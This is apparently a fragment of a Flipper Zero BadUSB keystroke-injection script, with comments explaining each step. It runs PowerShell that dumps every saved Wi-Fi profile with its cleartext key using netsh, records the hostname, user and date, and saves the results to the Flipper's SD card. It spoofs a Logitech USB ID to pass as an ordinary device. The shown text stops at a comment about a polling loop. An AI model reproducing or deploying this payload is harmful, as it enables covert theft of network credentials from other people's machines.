REM ## The powershell starts with a delay. This is to give you time to hit BACK twice on the Flipper to get it out of BadUSB mode. Otherwise it wont save data.
REM ## If the normal FZ mode is detected, the script will determine which COM port the Flipper is plugged in and write a string to the specified path/file.

REM ## Command to execute/data to extract. Don't forget cast to string. 
ALTSTRING $d=(netsh wlan show profile name='*' key=clear|Out-String);

REM ## Useful info to know whence the above data came from
ALTSTRING $hn=(hostname);
ALTSTRING $who=(whoami);
ALTSTRING $date=(date);

REM ## The VendorID and ProductID to search. If you'd change the BadUSB IDs in this script, you need to change $BHID as well.
ALTSTRING $BHID="HID\\VID_046D\&PID_C529";
ALTSTRING $SUSB="USB\\VID_0483\&PID_5740";

REM ## The storage Path where the result is SPATHed at the Flipper Zero SD card
ALTSTRING $SPATH="/ext/wifi/wifi_data"

REM ## Perform 600 loops, to check if BadUSB is still active, wait 1 sec. If the Flipper is just disconnected, the loop will wait 4 sec.
